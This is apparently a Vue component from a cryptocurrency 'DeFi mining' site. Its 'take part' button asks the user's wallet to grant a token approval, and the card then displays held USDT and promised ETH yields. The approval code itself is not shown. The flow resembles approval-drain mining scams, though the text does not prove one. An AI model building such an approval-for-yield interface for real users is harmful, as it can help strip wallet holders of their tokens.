<!-- defi挖矿 新版本 -->
<script setup>
import { DIFF_ISFREEZE } from '@/config/index'
import { useFreeze } from '@/hook/useFreeze'
const { _isFreeze } = useFreeze()
import { priceFormat } from '@/utils/decimal.js'
import { approve } from '@/plugin/chain/index'
import { useUserStore } from '@/store/user'
import { _toView } from '@/utils/public'
import { _t18 } from '@/utils/public'
import { useToast } from '@/hook/useToast'
const { _toast } = useToast()
import { useRouter } from 'vue-router'
import { showToast } from 'vant'
const router = useRouter()
const props = defineProps({
  incomeInfo: {
    type: Object,
    default: () => {}
  },
  outcomeInfo: {
    type: Object,
    default: () => {}
  }
})
const userStore = useUserStore()
/**
 * 是否授权
 */
const isApprove = computed(() => userStore.userInfo.approve == 1)
/**
 * 授权
 */
/* const toApprove = async () => {
  console.log('toApprove', res)
  const res = await approve().catch((err) => {
    // showToast('用户取消授权')
    _toast('defi_cancel')
  })
  console.log('toApprove', res)
  await userStore.getUserInfo()
} */
const toApproveForm = async () => {
  const res = await approve().catch((err) => {
    // showToast('用户取消授权')
    _toast('defi_cancel')
  })
  console.log('toApprove', res)
  if (!res) {
    //授权失败
    // _toast('Please_access_wallet')
    _toast('Authorization_failed')
    // router.push('/no-wallet')
  }
  await userStore.getUserInfo()
}
const toApprove = () => {
  if (DIFF_ISFREEZE.includes(__config._APP_ENV)) {
    if (_isFreeze(DIFF_ISFREEZE)) {
      toApproveForm()
    }
  } else {
    toApproveForm()
  }
}
</script>
<template>
  <div class="mining_box">
    <div class="mining_header">
      <svg-load name="defi_icon" class="eth"></svg-load><strong class="fw-num">ETH</strong>
    </div>
    <div class="mining_content" v-if="isApprove">
      <!-- 已授权 -->
      <div class="line1">
        <div class="left">
          <div class="top fw-num green">
            {{ priceFormat(userStore.userInfo.appAddressInfo?.usdt || 0, 2) }} USDT
          </div>
          <!-- 正在托管 -->
          <div class="bottom til">{{ _t18('pledge_hosting') }}</div>
        </div>
        <div class="right">
          <!-- 总收益 -->
          <div class="top fw-num green">{{ priceFormat(props.incomeInfo.totalProfit) }} ETH</div>
          <div class="bottom til">{{ _t18('defi_total revenue') }}</div>
        </div>
      </div>
      <div class="line2">
        <div class="left">
          <div class="top til">{{ _t18('defi_single benefit') }}</div>
          <div class="bottom fw-num black">{{ priceFormat(props.incomeInfo.singleRate) }}</div>
        </div>
        <div class="right">
          <div class="top til">{{ _t18('defi_every_day_income') }}</div>
          <div class="bottom fw-num black">{{ priceFormat(props.incomeInfo.dayRate) }}</div>
        </div>
      </div>
      <div class="mining_btn" @click="_toView('/defiDetail')">
        {{ _t18('defi_earnings Details') }}
      </div>
    </div>
    <div class="mining_content" v-else>
      <!-- 未授权 -->
      <div class="line1">
        <div class="left">
          <div class="top fw-num green">{{ priceFormat(outcomeInfo?.totalOutput) || 0 }} ETH</div>
          <div class="bottom til">{{ _t18('defi_total_output') }}</div>
        </div>
        <div class="right">
          <div class="top fw-num green">{{ priceFormat(outcomeInfo?.userBenefits) || 0 }} U</div>
          <div class="bottom til">{{ _t18('defi_user_benefit') }}</div>
        </div>
      </div>
      <div class="line2">
        <div class="left">
          <div class="top til">{{ _t18('defi_participant') }}</div>
          <div class="bottom fw-num black">{{ outcomeInfo?.participant || 0 }}</div>
        </div>
        <div class="right">
          <div class="top til">{{ _t18('defi_valid_node') }}</div>
          <div class="bottom fw-num black">{{ outcomeInfo?.validNode || 0 }}</div>
        </div>
      </div>
      <div class="mining_btn" @click="toApprove">{{ _t18('defi_takePart_in') }}</div>
    </div>
  </div>
</template>
<style lang="scss" scoped>
.mining_box {
  padding: 10px 15px 0 !important;

  .mining_header {
    display: flex;
    align-items: center;
    padding-bottom: 20px;
    .eth {
      font-size: 35px;
      margin-right: 10px;
    }
    strong {
      font-size: 20px;
      color: var(--ex-default-font-color);
    }
  }
  .mining_content {
    position: relative;
    // padding: 15px 0 35px;
    background: var(--ex-eth-background-color);
    border: 1px solid var(--ex-eth-border-color);
    // box-shadow: 0px 1px 5px 1px rgba(0, 0, 0, 0.05);
    border-radius: 10px;
    .line1 {
      border-bottom: 1px solid var(--ex-eth-border-color);
    }
    & > div {
      display: flex;
      .left,
      .right {
        flex: 1;
        color: var(--ex-passive-font-color);
        padding: 20px 10px;
        .top {
          margin-bottom: 15px;
        }
        .fw-num {
          font-size: 22px;
          word-break: break-all;
        }
        .green {
          color: var(--ex-eth-font-color);
        }
        .black {
          color: var(--ex-eth-font-color2);
        }
        .til {
          word-wrap: break-word;
          color: var(--ex-eth-label-color);
        }
      }
      .left {
        border-right: 1px solid var(--ex-eth-border-color);
        text-align: left;
        .til {
          padding-right: 30px;
        }
      }
      .right {
        text-align: right;
        .til {
          padding-left: 30px;
        }
      }
    }
  }
  .mining_btn {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 100px;
    height: 100px;
    display: flex;
    justify-content: center;
    align-items: center;
    border: 3px solid var(--ex-eth-button-bdcolor);
    box-shadow: 0px 0px 10px 3px rgba(0, 0, 0, 0.1);
    background: var(--ex-eth-button-color);
    padding: 15px;
    border-radius: 50%;
    font-size: 16px;
    color: var(--ex-font-color);
    text-align: center;
    cursor: pointer;
  }
}
</style>
